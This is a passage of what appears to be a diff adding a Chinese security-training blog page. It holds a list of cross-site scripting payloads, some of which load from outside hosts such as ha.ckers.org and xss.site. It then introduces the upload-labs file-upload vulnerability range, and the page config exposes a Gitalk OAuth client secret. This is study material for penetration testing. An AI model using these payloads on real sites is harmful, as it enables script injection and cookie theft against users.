class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">javascript:/M/</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">,alert(1)</span>&gt;</span>M<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">javascript:/M/</span>&gt;</span><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">,alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="keyword">var</span> a=<span class="number">1</span><span class="comment">//@ sourceMappingURL=//xss.site</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(document.cookie)</span>&gt;</span>.gif</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;background-image:url(javascript:alert(/xss/))&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span>@import&#x27;http://ha.ckers.org/xss.css&#x27;;<span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html,&lt;iframe src=javascript:alert(&#x27;M&#x27;)&gt;&lt;/iframe&gt;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">data:text/html;base64,PGlmcmFtZSBzcmM9amF2YXNjcmlwdDphbGVydCgiTWFubml4Iik+PC9pZnJhbWU+</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=&lt;<span class="attr">svg</span>/<span class="attr">o</span>&amp;#<span class="attr">x6E</span>;<span class="attr">load</span>&amp;<span class="attr">equals</span>;<span class="attr">alert</span>&amp;<span class="attr">lpar</span>;<span class="attr">1</span>)&amp;<span class="attr">gt</span>;&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">https://baidu.com</span> <span class="attr">width</span>=<span class="string">1366</span> <span class="attr">height</span>=<span class="string">768</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(1)</span> <span class="attr">width</span>=<span class="string">1366</span> <span class="attr">height</span>=<span class="string">768</span>&gt;</span>&lt;/iframe</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">javascript:alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">formaction</span>=<span class="string">javascript:alert(1)</span>&gt;</span>M</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">formaction</span>=<span class="string">javascript:alert(1)</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">M</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">formaction</span>=<span class="string">javascript:alert(1)</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">value</span>=<span class="string">M</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">formaction</span>=<span class="string">javascript:alert(1)</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">src</span>=<span class="string">1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">&quot;Link&quot;</span> <span class="attr">Content</span>=<span class="string">&quot;&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h1><p>官方README.md：</p>
+<p>upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共20关，每一关都包含着不同上传方式。</p>
+<p>正好做了一部分，记录如下：</p>
+<p><a href="http://got17.cn/1070/">【网络安全2x01】上传漏洞靶场upload-labs（Pass01-04）</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag"># 网络安全</a>
+              <a href="/tags/burpsuite/" rel="tag"># burpsuite</a>
+              <a href="/tags/upload-labs/" rel="tag"># upload-labs</a>
+              <a href="/tags/dvwa/" rel="tag"># dvwa</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/1072/" rel="prev" title="【网络安全1x02】安恒厂家网络安全培训 --- day2">
+                  <i class="fa fa-chevron-left"></i> 【网络安全1x02】安恒厂家网络安全培训 --- day2
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/1074/" rel="next" title="【网络安全1x04】安恒厂家网络安全培训 --- day4">
+                  【网络安全1x04】安恒厂家网络安全培训 --- day4 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa-solid fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">gaoteng17</span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.0/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"client_id":"96531982aa814e82e033","client_secret":"9d64fd0a7523408d110bfc9839658aaa2a0ee62e","repo":"Blog_Comments","github_id":"gaoteng17","admin_user":"gaoteng17","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":null,"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.min.js","integrity":"sha256-MVK9MGD/XJaGyIghSVrONSnoXoGh3IFxLw0zfvzpxR4="},"path_md5":"6a8822e0d78f1d33fd8c2b8cfd0fd35a"}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+
+</body>
+</html>
